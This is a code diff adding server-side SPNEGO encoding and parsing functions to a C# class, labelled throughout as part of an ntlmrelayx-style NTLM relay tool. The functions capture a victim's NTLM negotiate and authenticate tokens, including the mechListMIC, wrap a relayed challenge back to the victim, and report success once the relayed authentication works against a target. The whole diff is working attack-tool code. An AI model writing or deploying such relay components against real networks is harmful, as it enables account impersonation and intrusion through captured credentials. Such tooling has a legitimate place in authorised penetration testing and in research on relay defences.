@@ -89,6 +89,164 @@ public static class Spnego
         return writer.Encode();
     }
 
+    /// <summary>SPNEGO negState values (RFC 4178): the first field of a NegTokenResp.</summary>
+    private enum NegState
+    {
+        AcceptCompleted = 0,
+        AcceptIncomplete = 1,
+        Reject = 2,
+    }
+
+    /// <summary>
+    /// Server side (ntlmrelayx): the SPNEGO <c>NegTokenInit</c> a server returns in its SMB2
+    /// NEGOTIATE response, advertising NTLMSSP as the supported mechanism (GSS-wrapped, as a real
+    /// Windows server sends it in the negotiate SecurityBuffer).
+    /// </summary>
+    public static byte[] WrapServerNegotiateHint()
+    {
+        var writer = new AsnWriter(AsnEncodingRules.DER);
+        using (writer.PushSequence(Application0))
+        {
+            writer.WriteObjectIdentifier(SpnegoOid);
+            using (writer.PushSequence(Context0))          // negTokenInit [0]
+            using (writer.PushSequence())                  // NegTokenInit SEQUENCE
+            using (writer.PushSequence(Context0))          // mechTypes [0]
+            {
+                writer.WriteEncodedValue(NtlmMechListDer); // SEQUENCE OF MechType (NTLMSSP)
+            }
+        }
+
+        return writer.Encode();
+    }
+
+    /// <summary>
+    /// Server side (ntlmrelayx): wraps a relayed NTLM CHALLENGE (Type 2) as a <c>NegTokenResp</c>
+    /// with negState=accept-incomplete and supportedMech=NTLMSSP — what the relay server returns to
+    /// the victim in the first SESSION_SETUP response.
+    /// </summary>
+    public static byte[] WrapChallenge(byte[] ntlmChallenge)
+    {
+        var writer = new AsnWriter(AsnEncodingRules.DER);
+        using (writer.PushSequence(Context1))              // negTokenResp [1]
+        using (writer.PushSequence())                      // NegTokenResp SEQUENCE
+        {
+            using (writer.PushSequence(Context0))          // negState [0]
+            {
+                writer.WriteEnumeratedValue(NegState.AcceptIncomplete);
+            }
+
+            using (writer.PushSequence(Context1))          // supportedMech [1]
+            {
+                writer.WriteObjectIdentifier(NtlmSspOid);
+            }
+
+            using (writer.PushSequence(Context2))          // responseToken [2]
+            {
+                writer.WriteOctetString(ntlmChallenge);
+            }
+        }
+
+        return writer.Encode();
+    }
+
+    /// <summary>
+    /// Server side (ntlmrelayx): the final <c>NegTokenResp</c> with negState=accept-completed the relay
+    /// server returns once the relayed AUTHENTICATE succeeds against the target.
+    /// </summary>
+    public static byte[] WrapAcceptCompleted()
+    {
+        var writer = new AsnWriter(AsnEncodingRules.DER);
+        using (writer.PushSequence(Context1))              // negTokenResp [1]
+        using (writer.PushSequence())                      // NegTokenResp SEQUENCE
+        using (writer.PushSequence(Context0))              // negState [0]
+        {
+            writer.WriteEnumeratedValue(NegState.AcceptCompleted);
+        }
+
+        return writer.Encode();
+    }
+
+    /// <summary>
+    /// Server side (ntlmrelayx): extracts the NTLM NEGOTIATE (Type 1) from a victim's SPNEGO
+    /// <c>NegTokenInit</c> (the first SESSION_SETUP), whether GSS-wrapped or a bare <c>[0]</c> token.
+    /// </summary>
+    public static byte[] ExtractInitialToken(byte[] spnego)
+    {
+        var reader = new AsnReader(spnego, AsnEncodingRules.DER);
+        Asn1Tag tag = reader.PeekTag();
+
+        AsnReader negTokenInit;
+        if (tag.HasSameClassAndValue(Application0))
+        {
+            AsnReader gss = reader.ReadSequence(Application0);
+            gss.ReadObjectIdentifier();
+            negTokenInit = gss.ReadSequence(Context0).ReadSequence();
+        }
+        else
+        {
+            negTokenInit = reader.ReadSequence(Context0).ReadSequence();
+        }
+
+        while (negTokenInit.HasData)
+        {
+            Asn1Tag field = negTokenInit.PeekTag();
+            if (field.HasSameClassAndValue(Context2))      // mechToken [2]
+            {
+                return negTokenInit.ReadSequence(Context2).ReadOctetString();
+            }
+
+            negTokenInit.ReadEncodedValue();               // skip mechTypes / reqFlags
+        }
+
+        throw new InvalidDataException("SPNEGO NegTokenInit did not contain a mechToken.");
+    }
+
+    /// <summary>
+    /// Server side (ntlmrelayx): extracts the NTLM AUTHENTICATE (Type 3) and the optional
+    /// <c>mechListMIC</c> from a victim's SPNEGO <c>NegTokenResp</c> (the second SESSION_SETUP), so the
+    /// relay can forward both to the target.
+    /// </summary>
+    public static (byte[] Token, byte[]? MechListMic) ExtractResponseTokenWithMic(byte[] spnego)
+    {
+        var reader = new AsnReader(spnego, AsnEncodingRules.DER);
+        Asn1Tag tag = reader.PeekTag();
+
+        AsnReader negTokenResp;
+        if (tag.HasSameClassAndValue(Application0))
+        {
+            AsnReader gss = reader.ReadSequence(Application0);
+            gss.ReadObjectIdentifier();
+            Asn1Tag inner = gss.PeekTag();
+            negTokenResp = gss.ReadSequence(inner.HasSameClassAndValue(Context0) ? Context0 : Context1);
+        }
+        else
+        {
+            negTokenResp = reader.ReadSequence(Context1);
+        }
+
+        AsnReader sequence = negTokenResp.ReadSequence();
+        byte[]? responseToken = null;
+        byte[]? mechListMic = null;
+        while (sequence.HasData)
+        {
+            Asn1Tag field = sequence.PeekTag();
+            if (field.HasSameClassAndValue(Context2))
+            {
+                responseToken = sequence.ReadSequence(Context2).ReadOctetString();
+            }
+            else if (field.HasSameClassAndValue(Context3))
+            {
+                mechListMic = sequence.ReadSequence(Context3).ReadOctetString();
+            }
+            else
+            {
+                sequence.ReadEncodedValue();
+            }
+        }
+
+        return (responseToken ?? throw new InvalidDataException("SPNEGO response had no responseToken."), mechListMic);
+    }
+
     /// <summary>
     /// Extracts the NTLM token (CHALLENGE / Type 2) from a server's SPNEGO
     /// <c>NegTokenResp</c> (or a GSS-wrapped token, as a fallback).
